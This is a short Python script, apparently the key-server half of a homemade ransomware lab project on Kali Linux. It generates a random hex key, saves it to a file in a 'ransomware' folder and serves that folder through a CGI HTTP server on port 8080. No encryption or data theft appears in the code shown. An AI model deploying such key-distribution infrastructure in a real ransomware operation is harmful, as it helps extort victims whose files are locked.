
#coding:utf-8

import http.server
import secrets
 

cle = secrets.token_hex(32)
print (cle)
fichier = open("/home/kali/Documents/ransomware/cle.txt", "w")
fichier.write(cle)
fichier.close()

PORT = 8080
address = ("", PORT)

server = http.server.HTTPServer

handler = http.server.CGIHTTPRequestHandler

handler.cgi_directories = ["/home/kali/Documents/ransomware/"]

httpd = server(address, handler)
print("Serveur actif sur le port :", PORT)

httpd.serve_forever()



